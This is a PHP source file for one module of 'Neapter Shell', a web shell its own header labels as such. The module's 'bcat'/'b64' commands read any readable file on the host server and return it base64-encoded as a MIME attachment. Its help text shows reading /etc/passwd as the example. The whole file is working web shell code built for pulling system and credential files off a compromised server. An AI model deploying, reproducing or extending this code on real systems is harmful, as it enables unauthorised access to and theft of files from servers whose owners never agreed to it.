<?php

/**
 * Neapter Shell
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */

/**
 * Encode file using base64
 *
 * @category  WebShell
 * @package   NeapterShell
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright 2011-2016 Krzysztof Otręba
 *
 * @license http://www.gnu.org/licenses/gpl-3.0.txt GPL3
 * @link    http://github.com/krzotr/neapter-shell
 */
class ModuleBcat extends ModuleAbstract
{
    /**
     * Get list of available commands
     *
     * @return array
     */
    public static function getCommands()
    {
        return array(
            'bcat',
            'b64'
        );
    }

    /**
     * Get module version
     *
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.1 2016-06-17 - <krzotr@gmail.com>';
    }

    /**
     * Get details module information
     *
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
Wyświetlanie zawartości pliku przy użyciu base64

	Użycie:
		bcat ścieżka_do_pliku

	Przykład:
		bcat /etc/passwd
DATA;
    }

    /**
     * Execute module
     *
     * @return string
     */
    public function get()
    {
        if ($this->oArgs->getNumberOfParams() === 0) {
            return self::getHelp();
        }

        $sFilePath = $this->oArgs->getParam(0);

        if (!(is_file($sFilePath) && is_readable($sFilePath))) {
            return sprintf('Plik "%s" nie istnieje', $sFilePath);
        }

        $sHeader = "MIME-Version: 1.0\r\n" .
            "Content-Type: application/octet-stream; name=\"%s\"\r\n" .
            "Content-Transfer-Encoding: base64\r\n" .
            "Content-Disposition: attachment; filename=\"%s\"\r\n\r\n%s";

        $sMime = sprintf(
            $sHeader,
            basename($sFilePath),
            basename($sFilePath),
            chunk_split(base64_encode(file_get_contents($sFilePath)), 130)
        );

        return htmlspecialchars($sMime);
    }
}
